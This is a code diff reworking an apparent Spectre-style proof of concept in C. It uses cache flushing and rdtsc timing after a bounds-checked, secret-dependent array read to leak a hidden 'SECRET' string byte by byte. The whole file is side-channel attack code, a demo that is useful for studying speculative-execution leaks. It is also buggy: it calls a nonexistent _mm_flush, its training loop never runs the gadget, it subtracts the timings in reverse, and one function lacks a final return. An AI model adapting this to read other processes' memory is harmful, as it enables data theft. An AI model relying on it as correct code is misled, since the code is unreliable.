@@ -4,53 +4,94 @@
 #include <stdint.h>
 #include <x86intrin.h>
 
-#define CACHE_PAGE 128;
-#define COUNT 1000;
+#define CACHE_PAGE 128
+#define COUNT 100
+#define SECRET 16
+#define TRAIN 50
+#define FREQ 10
 
-volatile uint8_t detector[256 * CACHE_PAGE];
 
-void sink(uint_32 x){
+volatile char  secret[SECRET*16] = "\0\0\0\0" "\0\0\0\0" "\0\0\0\0" "\0\0\0\0" "SECRET";
+
+volatile uint32_t cache_detector[256 * CACHE_PAGE];
+volatile uint32_t secret_s = SECRET;
+volatile uint32_t detector_s = 256 * CACHE_PAGE;
+
+int x;
+
+void sink(uint32_t x){
     (void)x;
 } 
 
 void delay(){
     uint32_t x = 0x1234;
-    for(volatile int i = 0; i < 1000; i++){
+    for(int i = 0; i < 1000; i++){
         x *= i;
         x ^= 123;
         x * 173;
     }
 }
 
-uint32_t check(int idx){
-    for(int i = 0; i < 256; i++){
-        _mm_clflush((void*)(detector + i * CACHE_PAGE));
+void get_from_secret(int idx){
+    if(idx < secret_s){
+       x = x ^ cache_detector[secret[idx]*CACHE_PAGE];
     }
-    delay();
 
-    uint64_t a,b;
-    idx *= CACHE_PAGE;
-    a = __rdtdc();
-    sink(detector[idx]);
-    __mm_lfence();
-    b = __rdtdc();
-    return (unit32_T)(a - b);
 }
 
-uint32_t check2(int idx){
-    uint32_t sum = 0;
-
-    for(int i = 0; i < COUNT; i++){
-        sum += check(idx);
+uint32_t check_single_timing(int idx, int byte){
+    for(int i = 0; i < 256; i++){
+        _mm_clflush((void*)(cache_detector + i * CACHE_PAGE));
+        delay();
+    }
+    
+    for(int i=0; i<TRAIN;i++){
+        _mm_flush((void*)&secret_s);
+        delay();
+        int idx_ = i % secret_s;
     }
 
-    return sum / COUNT;
+    
+
+    _mm_lfence();
+    uint64_t a,b;
+    byte *= CACHE_PAGE;
+    a = __rdtsc();
+    sink(cache_detector[byte]);
+    _mm_lfence();
+    b = __rdtsc();
+    return (uint32_t)(a - b);
+}
+
+uint32_t check_all_timing(int idx, int byte){
+    uint32_t ram = 0;
+    uint32_t cache = 0;
+    
+
+    for(int i = 0; i < (int)COUNT; i++){
+        uint32_t timing = check_single_timing(idx, byte);
+        if(timing > 80){ram++;}else{cache++;}
+    }
+    if(cache > ram){return 1;}
+    return 0;
+    
+}
+
+uint8_t getByte(int idx){
+    uint8_t character = 0;
+
+    for(int i = 'A'; i <= 'Z'; i++){
+        if(check_all_timing(idx, i)==1){
+            return i;
+        }
+    }
+
 }
 
 int main(void){
-    uint32_t x = 0x1234;
-    for(int i = 'A'; i <= 'Z'; i++){
-        printf("/c: %u\n",i, check2(i));
+    for(int i = 0;i < 6; i++){
+        printf("%c",getByte(secret_s + i));
     }
+    printf("\n");
     return 0;
 }
